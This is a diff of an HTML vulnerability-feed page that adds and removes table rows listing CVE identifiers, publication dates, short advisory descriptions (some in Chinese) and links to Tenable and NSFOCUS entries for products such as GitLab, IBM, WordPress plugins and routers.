+       <td>Gitlab reports:ReDoS in branch search when using wildcardsReDoS in markdown render pipelineRedos on Discord integrationsRedos on Google Chat IntegrationDenial of Service Attack via Pin MenuDoS by filtering tags and branches via the APIMR approval via CSRF in SAML SSOBanned user from groups can read issues updates via the apiRequire confirmation before linking JWT identityView confidential issues title and description of any public project via exportSSRF via Github importer</td>
+       <td><a target="_blank" href="https://www.tenable.com/cve/CVE-2024-4597">详情</a></td>
+      </tr>
+
+      <tr>
+       <td>4e4f5b5b3037c532293b87ea24301229</td>
+       <td>CVE-2024-4539</td>
+       <td>2024-05-09 00:00:00 <img src="imgs/new.gif" /></td>
+       <td>Gitlab reports:ReDoS in branch search when using wildcardsReDoS in markdown render pipelineRedos on Discord integrationsRedos on Google Chat IntegrationDenial of Service Attack via Pin MenuDoS by filtering tags and branches via the APIMR approval via CSRF in SAML SSOBanned user from groups can read issues updates via the apiRequire confirmation before linking JWT identityView confidential issues title and description of any public project via exportSSRF via Github importer</td>
+       <td><a target="_blank" href="https://www.tenable.com/cve/CVE-2024-4539">详情</a></td>
+      </tr>
+
+      <tr>
+       <td>6fa77327930c2f5eeca0b0a56dde033c</td>
+       <td>CVE-2024-3976</td>
+       <td>2024-05-09 00:00:00 <img src="imgs/new.gif" /></td>
+       <td>Gitlab reports:ReDoS in branch search when using wildcardsReDoS in markdown render pipelineRedos on Discord integrationsRedos on Google Chat IntegrationDenial of Service Attack via Pin MenuDoS by filtering tags and branches via the APIMR approval via CSRF in SAML SSOBanned user from groups can read issues updates via the apiRequire confirmation before linking JWT identityView confidential issues title and description of any public project via exportSSRF via Github importer</td>
+       <td><a target="_blank" href="https://www.tenable.com/cve/CVE-2024-3976">详情</a></td>
+      </tr>
+
+      <tr>
        <td>c3e2b6b243e34573d0b81c24d1e300fc</td>
        <td>CVE-2024-34257</td>
        <td>2024-05-08 17:15:07</td>
@@ -441,86 +521,6 @@
        <td>2024-05-07 23:15:16</td>
        <td>D-Link DAP-2622 DDP Set SSID List Missing Authentication Vulnerability. This vulnerability allows network-adjacent attackers to make unauthorized changes to device configuration on affected installations of D-Link DAP-2622 routers. Authentication is not required to exploit this vulnerability. The specific flaw exists within the DDP service. The issue results from the lack of authentication prior to allowing access to functionality. An attacker can leverage this vulnerability to manipulate wireless authentication settings. Was ZDI-CAN-20104.</td>
        <td><a target="_blank" href="https://www.tenable.com/cve/CVE-2023-37325">详情</a></td>
-      </tr>
-
-      <tr>
-       <td>2d9be68420cba2948c175e712a063298</td>
-       <td>CVE-2024-2913</td>
-       <td>2024-05-07 00:15:08</td>
-       <td>A race condition vulnerability exists in the mintplex-labs/anything-llm repository, specifically within the user invite acceptance process. Attackers can exploit this vulnerability by sending multiple concurrent requests to accept a single user invite, allowing the creation of multiple user accounts from a single invite link intended for only one user. This bypasses the intended security mechanism that restricts invite acceptance to a single user, leading to unauthorized user creation without detection in the invite tab. The issue is due to the lack of validation for concurrent requests in the backend.</td>
-       <td><a target="_blank" href="https://www.tenable.com/cve/CVE-2024-2913">详情</a></td>
-      </tr>
-
-      <tr>
-       <td>c75f9c10b0188bbe784303346f82c4ad</td>
-       <td>CVE-2024-29941</td>
-       <td>2024-05-06 23:15:06</td>
-       <td>Insecure storage of the ICT MIFARE and DESFire encryption keys in the firmware binary allows malicious actors to create credentials for any site code and card number that is using the default ICT encryption.</td>
-       <td><a target="_blank" href="https://www.tenable.com/cve/CVE-2024-29941">详情</a></td>
-      </tr>
-
-      <tr>
-       <td>790ea72696b2e509d34b4cd85ddd8380</td>
-       <td>CVE-2024-30973</td>
-       <td>2024-05-06 22:15:08</td>
-       <td>An issue in V-SOL G/EPON ONU HG323AC-B with firmware version V2.0.08-210715 allows an attacker to execute arbtirary code and obtain sensitive information via crafted POST request to /boaform/getASPdata/formFirewall, /boaform/getASPdata/formAcc.</td>
-       <td><a target="_blank" href="https://www.tenable.com/cve/CVE-2024-30973">详情</a></td>
-      </tr>
-
-      <tr>
-       <td>5667d789165fae694b80032a973dbe17</td>
-       <td>CVE-2024-34534</td>
-       <td>2024-05-06 21:15:48</td>
-       <td>A SQL injection vulnerability in Cybrosys Techno Solutions Text Commander module (aka text_commander) 16.0 through 16.0.1 allows a remote attacker to gain privileges via the data parameter to models/ir_model.py:IrModel::chech_model.</td>
-       <td><a target="_blank" href="https://www.tenable.com/cve/CVE-2024-34534">详情</a></td>
-      </tr>
-
-      <tr>
-       <td>365082e158b0768c01c20d1227bbbbd1</td>
-       <td>CVE-2024-34533</td>
-       <td>2024-05-06 21:15:48</td>
-       <td>A SQL injection vulnerability in ZI PT Solusi Usaha Mudah Analytic Data Query module (aka izi_data) 11.0 through 17.x before 17.0.3 allows a remote attacker to gain privileges via a query to IZITools::query_check, IZITools::query_fetch, or IZITools::query_execute.</td>
-       <td><a target="_blank" href="https://www.tenable.com/cve/CVE-2024-34533">详情</a></td>
-      </tr>
-
-      <tr>
-       <td>7ee3bc3ab6d06c7967175aecc59cf4bb</td>
-       <td>CVE-2024-34532</td>
-       <td>2024-05-06 21:15:48</td>
-       <td>A SQL injection vulnerability in Yvan Dotet PostgreSQL Query Deluxe module (aka query_deluxe) 17.x before 17.0.0.4 allows a remote attacker to gain privileges via the query parameter to models/querydeluxe.py:QueryDeluxe::get_result_from_query.</td>
-       <td><a target="_blank" href="https://www.tenable.com/cve/CVE-2024-34532">详情</a></td>
-      </tr>
-
-      <tr>
-       <td>a6c271677f8b5c4d62dcb2e8082098de</td>
-       <td>CVE-2024-34413</td>
-       <td>2024-05-06 21:15:48</td>
-       <td>Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in SliceWP allows Stored XSS.This issue affects SliceWP: from n/a through 1.1.10.</td>
-       <td><a target="_blank" href="https://www.tenable.com/cve/CVE-2024-34413">详情</a></td>
-      </tr>
-
-      <tr>
-       <td>f0ea29e053227cf62051a1a5725afc5d</td>
-       <td>CVE-2024-28725</td>
-       <td>2024-05-06 21:15:48</td>
-       <td>Cross Site Scripting (XSS) vulnerability in YzmCMS 7.0 allows attackers to run arbitrary code via Ads Management, Carousel Management, and System Settings.</td>
-       <td><a target="_blank" href="https://www.tenable.com/cve/CVE-2024-28725">详情</a></td>
-      </tr>
-
-      <tr>
-       <td>3b27ca14bad075026017b1c9b37ba3a7</td>
-       <td>CVE-2024-1695</td>
-       <td>2024-05-06 21:15:48</td>
-       <td>A potential security vulnerability has been identified in the HP Application Enabling Software Driver for certain HP PC products, which might allow escalation of privilege. HP is releasing software updates to mitigate this potential vulnerability.</td>
-       <td><a target="_blank" href="https://www.tenable.com/cve/CVE-2024-1695">详情</a></td>
-      </tr>
-
-      <tr>
-       <td>6cbdf5d08ee14f65dcf9ef372bada2a5</td>
-       <td>CVE-2023-33548</td>
-       <td>2024-05-06 21:15:48</td>
-       <td>Cross Site Scripting (XSS) vulnerability in ASUS RT-AC51U with firmware versions up to and including 3.0.0.4.380.8591 allows attackers to run arbitrary code via the WPA Pre-Shared Key field.</td>
-       <td><a target="_blank" href="https://www.tenable.com/cve/CVE-2023-33548">详情</a></td>
       </tr>
 
      </tbody>
@@ -1964,6 +1964,126 @@
        <th width="5%">URL</th>
       </tr>
       <tr>
+       <td>dcc499b87574144c124d82ea56a02fa2</td>
+       <td>CVE-2021-38938</td>
+       <td>2024-05-10 23:35:21 <img src="imgs/new.gif" /></td>
+       <td>IBM Host Access Transformation Services信息泄露漏洞</td>
+       <td><a target="_blank" href="http://www.nsfocus.net/vulndb/94683">详情</a></td>
+      </tr>
+
+      <tr>
+       <td>fedcd22bf677d7ba1283137ef9268429</td>
+       <td>CVE-2023-47162</td>
+       <td>2024-05-10 23:35:21 <img src="imgs/new.gif" /></td>
+       <td>IBM Sterling Secure Proxy跨站脚本漏洞</td>
+       <td><a target="_blank" href="http://www.nsfocus.net/vulndb/94682">详情</a></td>
+      </tr>
+
+      <tr>
+       <td>f3cb4125992652ec2e682c85e433be2c</td>
+       <td>CVE-2023-46182</td>
+       <td>2024-05-10 23:35:21 <img src="imgs/new.gif" /></td>
+       <td>IBM Sterling Secure Proxy跨站脚本漏洞</td>
+       <td><a target="_blank" href="http://www.nsfocus.net/vulndb/94681">详情</a></td>
+      </tr>
+
+      <tr>
+       <td>cb1dba16726612cb00da510050b8139a</td>
+       <td>CVE-2024-28070</td>
+       <td>2024-05-10 23:35:21 <img src="imgs/new.gif" /></td>
+       <td>Mitel MiContact Center Business信息泄露漏洞</td>
+       <td><a target="_blank" href="http://www.nsfocus.net/vulndb/94680">详情</a></td>
+      </tr>
+
+      <tr>
+       <td>e2f7af369639e47c1bf5bcfca88c02bc</td>
+       <td>CVE-2024-22513</td>
+       <td>2024-05-10 23:35:21 <img src="imgs/new.gif" /></td>
+       <td>Simple JWT信息泄露漏洞</td>
+       <td><a target="_blank" href="http://www.nsfocus.net/vulndb/94679">详情</a></td>
+      </tr>
+
+      <tr>
+       <td>5b1d2b8ca75d05992235fcfcb2d49181</td>
+       <td>CVE-2024-28640</td>
+       <td>2024-05-10 23:35:21 <img src="imgs/new.gif" /></td>
+       <td>TOTOLink X5000R和A7000R缓冲区溢出漏洞</td>
+       <td><a target="_blank" href="http://www.nsfocus.net/vulndb/94678">详情</a></td>
+      </tr>
+
+      <tr>
+       <td>2f187238b6ccdde1a1360201445ae916</td>
+       <td>CVE-2024-28639</td>
+       <td>2024-05-10 23:35:21 <img src="imgs/new.gif" /></td>
+       <td>TOTOLink X5000R和A7000R缓冲区溢出漏洞</td>
+       <td><a target="_blank" href="http://www.nsfocus.net/vulndb/94677">详情</a></td>
+      </tr>
+
+      <tr>
+       <td>222bed1130f690f6442b5c4e79be2d90</td>
+       <td>CVE-2023-46179</td>
+       <td>2024-05-10 23:35:21 <img src="imgs/new.gif" /></td>
+       <td>IBM Sterling Secure Proxy信息泄露漏洞</td>
+       <td><a target="_blank" href="http://www.nsfocus.net/vulndb/94676">详情</a></td>
+      </tr>
+
+      <tr>
+       <td>8f300ce972351ec8676ddeccc08df06a</td>
+       <td>CVE-2024-28069</td>
+       <td>2024-05-10 23:35:21 <img src="imgs/new.gif" /></td>
+       <td>Mitel MiContact Center Business信息泄露漏洞</td>
+       <td><a target="_blank" href="http://www.nsfocus.net/vulndb/94675">详情</a></td>
+      </tr>
+
+      <tr>
+       <td>81ceb07131177a0aa1481d3ec3749330</td>
+       <td>CVE-2024-2495</td>
+       <td>2024-05-10 23:35:21 <img src="imgs/new.gif" /></td>
+       <td>FriendlyWrt加密密钥漏洞</td>
+       <td><a target="_blank" href="http://www.nsfocus.net/vulndb/94674">详情</a></td>
+      </tr>
+
+      <tr>
+       <td>b4beced351a2368355455ab4f05afc3a</td>
+       <td>CVE-2024-2294</td>
+       <td>2024-05-10 23:35:21 <img src="imgs/new.gif" /></td>
+       <td>WordPress Backuply Plugin目录遍历漏洞</td>
+       <td><a target="_blank" href="http://www.nsfocus.net/vulndb/94673">详情</a></td>
+      </tr>
+
+      <tr>
+       <td>af1904a750b6d1fe91dd794f6564f7f2</td>
+       <td>CVE-2023-6725</td>
+       <td>2024-05-10 23:35:21 <img src="imgs/new.gif" /></td>
+       <td>OpenStack Designate访问控制错误漏洞</td>
+       <td><a target="_blank" href="http://www.nsfocus.net/vulndb/94672">详情</a></td>
+      </tr>
+
+      <tr>
+       <td>42b96babc8ff3401debbb65b3df9057c</td>
+       <td>CVE-2024-2308</td>
+       <td>2024-05-10 23:35:21 <img src="imgs/new.gif" /></td>
+       <td>WordPress ElementInvader Addons for Elementor Plugin跨站脚本漏洞</td>
+       <td><a target="_blank" href="http://www.nsfocus.net/vulndb/94671">详情</a></td>
+      </tr>
+
+      <tr>
+       <td>f7cab244a92c930f1fb49b1a834b971e</td>
+       <td>CVE-2024-28847</td>
+       <td>2024-05-10 23:35:21 <img src="imgs/new.gif" /></td>
+       <td>OpenMetadata代码注入漏洞</td>
+       <td><a target="_blank" href="http://www.nsfocus.net/vulndb/94670">详情</a></td>
+      </tr>
+
+      <tr>
+       <td>ecf8b658e8021d4bd64f9b1e30263801</td>
+       <td>CVE-2024-6525</td>
+       <td>2024-05-10 23:35:21 <img src="imgs/new.gif" /></td>
+       <td>WordPress ElementsKit Elementor addons Plugin跨站脚本漏洞</td>
+       <td><a target="_blank" href="http://www.nsfocus.net/vulndb/94669">详情</a></td>
+      </tr>
+
+      <tr>
        <td>cddd234b02d34e2ed528cf27f1a9edd3</td>
        <td>CVE-2024-28425</td>
        <td>2024-05-09 23:35:52 <img src="imgs/new.gif" /></td>
@@ -2081,126 +2201,6 @@
        <td>2024-05-09 23:35:52 <img src="imgs/new.gif" /></td>
        <td>Mattermost不受控制的资源消耗漏洞</td>
        <td><a target="_blank" href="http://www.nsfocus.net/vulndb/94617">详情</a></td>
-      </tr>
-
-      <tr>
-       <td>f38cd5d0e49cdfd96593ab8c576d0638</td>
-       <td>CVE-2023-42938</td>
-       <td>2024-05-08 23:35:52</td>
-       <td>iTunes for Windows权限提升漏洞</td>
-       <td><a target="_blank" href="http://www.nsfocus.net/vulndb/94576">详情</a></td>
-      </tr>
-
-      <tr>
-       <td>931980481d5e62d65c3120fa34d53dea</td>
-       <td>CVE-2024-25653</td>
-       <td>2024-05-08 23:35:52</td>
-       <td>Delinea PAM Secret Server访问控制错误漏洞</td>
-       <td><a target="_blank" href="http://www.nsfocus.net/vulndb/94575">详情</a></td>
-      </tr>
-
-      <tr>
-       <td>af5ab7402edbcffba782efc76f1210d5</td>
-       <td>CVE-2024-22346</td>
-       <td>2024-05-08 23:35:52</td>
-       <td>IBM i权限许可和访问控制漏洞</td>
-       <td><a target="_blank" href="http://www.nsfocus.net/vulndb/94574">详情</a></td>
-      </tr>
-
-      <tr>
-       <td>5bc0ade68ac7e2329634c900b220f236</td>
-       <td>CVE-2024-27265</td>
-       <td>2024-05-08 23:35:52</td>
-       <td>IBM Integration Bus for z/OS跨站请求伪造漏洞</td>
-       <td><a target="_blank" href="http://www.nsfocus.net/vulndb/94573">详情</a></td>
-      </tr>
-
-      <tr>
-       <td>f858d7f1ae681d2d3ecdc32e0afda767</td>
-       <td>CVE-2024-28181</td>
-       <td>2024-05-08 23:35:52</td>
-       <td>TurboBoost Commands注入漏洞</td>
-       <td><a target="_blank" href="http://www.nsfocus.net/vulndb/94572">详情</a></td>
-      </tr>
-
-      <tr>
-       <td>7bf2d005016eff3535919c62d7bdeb48</td>
-       <td>CVE-2024-22398</td>
-       <td>2024-05-08 23:35:52</td>
-       <td>SonicWALL Email Security Appliance路径遍历漏洞</td>
-       <td><a target="_blank" href="http://www.nsfocus.net/vulndb/94571">详情</a></td>
-      </tr>
-
-      <tr>
-       <td>8601f610d9c3f317f18c8788cb5291d8</td>
-       <td>CVE-2023-38575</td>
-       <td>2024-05-08 23:35:52</td>
-       <td>Intel Processors信息泄露漏洞</td>
-       <td><a target="_blank" href="http://www.nsfocus.net/vulndb/94570">详情</a></td>
-      </tr>
-
-      <tr>
-       <td>8427c43f1fac1d903d18294509959f3c</td>
-       <td>CVE-2024-1654</td>
-       <td>2024-05-08 23:35:52</td>
-       <td>PaperCut NG/MF远程代码执行漏洞</td>
-       <td><a target="_blank" href="http://www.nsfocus.net/vulndb/94569">详情</a></td>
-      </tr>
-
-      <tr>
-       <td>4d948e23703c002e321c1fdb7af74b87</td>
-       <td>CVE-2024-25649</td>
-       <td>2024-05-08 23:35:52</td>
-       <td>Delinea PAM Secret Server和Distributed Engine信息泄露漏洞</td>
-       <td><a target="_blank" href="http://www.nsfocus.net/vulndb/94568">详情</a></td>
-      </tr>
-
-      <tr>
-       <td>b9d00a7f8c74c7705c627b0363c1fac4</td>
-       <td>CVE-2024-25651</td>
-       <td>2024-05-08 23:35:52</td>
-       <td>Delinea PAM Secret Server信息泄露漏洞</td>
-       <td><a target="_blank" href="http://www.nsfocus.net/vulndb/94567">详情</a></td>
-      </tr>
-
-      <tr>
-       <td>88f9842fbf1d0cb3b8e2d319f10c7cde</td>
-       <td>CVE-2024-25652</td>
-       <td>2024-05-08 23:35:52</td>
-       <td>Delinea PAM Secret Server信息泄露漏洞</td>
-       <td><a target="_blank" href="http://www.nsfocus.net/vulndb/94566">详情</a></td>
-      </tr>
-
-      <tr>
-       <td>15fe0c1350cd6213263aeb04266c9fbc</td>
-       <td>CVE-2023-43490</td>
-       <td>2024-05-08 23:35:52</td>
-       <td>Intel Xeon Processors计算错误漏洞</td>
-       <td><a target="_blank" href="http://www.nsfocus.net/vulndb/94565">详情</a></td>
-      </tr>
-
-      <tr>
-       <td>f03ef7fb3d699a842e1a1fec38587f7f</td>
-       <td>CVE-2024-28390</td>
-       <td>2024-05-08 23:35:52</td>
-       <td>PrestaShop访问控制错误漏洞</td>
-       <td><a target="_blank" href="http://www.nsfocus.net/vulndb/94564">详情</a></td>
-      </tr>
-
-      <tr>
-       <td>3658d37af87f97dbf3c350b1e1954e31</td>
-       <td>CVE-2024-28391</td>
-       <td>2024-05-08 23:35:52</td>
-       <td>PrestaShop SQL注入漏洞</td>
-       <td><a target="_blank" href="http://www.nsfocus.net/vulndb/94563">详情</a></td>
-      </tr>
-
-      <tr>
-       <td>9395eea460da83a16ff89b2b9b9824c2</td>
-       <td>CVE-2024-28746</td>
-       <td>2024-05-08 23:35:52</td>
-       <td>Apache Airflow权限保留错误漏洞</td>
-       <td><a target="_blank" href="http://www.nsfocus.net/vulndb/94562">详情</a></td>
       </tr>
 
      </tbody>
